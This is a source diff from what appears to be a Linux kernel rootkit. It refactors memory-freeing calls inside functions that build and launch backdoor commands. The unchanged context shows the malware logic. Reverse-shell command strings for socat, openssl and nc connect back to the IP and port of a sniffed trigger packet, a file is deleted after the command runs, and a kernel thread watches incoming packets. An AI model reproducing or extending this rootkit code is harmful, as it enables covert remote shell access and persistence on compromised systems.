@@ -82,7 +82,7 @@ static void _unload_stat_ops(void) {
     for (i = 0; i < BD_OPS_SIZE; ++i) {
         int x;
         for (x = 0; x < BD_PATH_NUM; ++x) {
-            kv_mem_free(stat_ops[i].bin[x]);
+            kv_mem_free(&(stat_ops[i].bin[x]));
         }
     }
 }
@@ -203,7 +203,7 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
                                 snprintf(bd, len, "%s %s:%s:%u,%s %s:\"%s%s\"", exe, a, ip, src_port, b, c, d, e);
                         }
                     }
-                    kv_mem_free(a,b,c,d,e);
+                    kv_mem_free(&a,&b,&c,&d,&e);
                 }
                 break;
             case RR_SOCAT:
@@ -229,7 +229,7 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
                                 snprintf(bd, len, "%s %s:%s:%u,%s %s:%s", exe, a, ip, src_port, b, c, d);
                         }
                     }
-                    kv_mem_free(a,b,c,d);
+                    kv_mem_free(&a,&b,&c,&d);
                 }
                 break;
             case RR_OPENSSL:
@@ -260,7 +260,7 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
                                         a, b, c, d, b, c, e, exe, f, ip, src_port, b, c);
                         }
                     }
-                    kv_mem_free(a,b,c,d,e,f);
+                    kv_mem_free(&a,&b,&c,&d,&e,&f);
                 }
                 break;
             case RR_NC:
@@ -285,7 +285,7 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
                             prinfo("nc: %s\n", bd);
                         }
                     }
-                    kv_mem_free(a,b,c,d);
+                    kv_mem_free(&a,&b,&c,&d);
                 }
                 break;
             default:
@@ -315,14 +315,14 @@ static int _run_backdoor(struct iphdr *iph, struct tcphdr *tcph, int select) {
 
     if (!p0 || !p1 || !p2 || !p3) {
         prerr("Memory error\n");
-        kv_mem_free(p0,p1,p2,p3);
+        kv_mem_free(&p0,&p1,&p2,&p3);
         return ret;
     }
 
     if (select != RR_NC && !binpath) {
         /** do nothing */
         prwarn("Could not find executable associated with port %d\n", select);
-        kv_mem_free(p0,p1,p2,p3);
+        kv_mem_free(&p0,&p1,&p2,&p3);
         return ret;
     }
 
@@ -330,7 +330,7 @@ static int _run_backdoor(struct iphdr *iph, struct tcphdr *tcph, int select) {
     if (!rev) {
         /** do nothing */
         prwarn("Invalid port selection: %d\n", select);
-        kv_mem_free(p0,p1,p2,p3);
+        kv_mem_free(&p0,&p1,&p2,&p3);
         return ret;
     }
 
@@ -364,10 +364,10 @@ static int _run_backdoor(struct iphdr *iph, struct tcphdr *tcph, int select) {
             snprintf(f, len+1, "%s/%s", a, b);
             ret = fs_file_rm(f);
         }
-        kv_mem_free(a,b);
+        kv_mem_free(&a,&b);
     }
 
-    kv_mem_free(p0,p1,p2,p3,rev);
+    kv_mem_free(&p0,&p1,&p2,&p3,&rev);
 
     return ret;
 }
@@ -675,7 +675,7 @@ struct task_struct *kv_sock_start_sniff(const char *name) {
         if (!tsk) goto leave;
 
         tsk_iph = kthread_run(_bd_watchdog_iph, NULL, iph0);
-        kv_mem_free(iph0);
+        kv_mem_free(&iph0);
         if (!tsk_iph) {
             kthread_stop(tsk);
             goto leave;
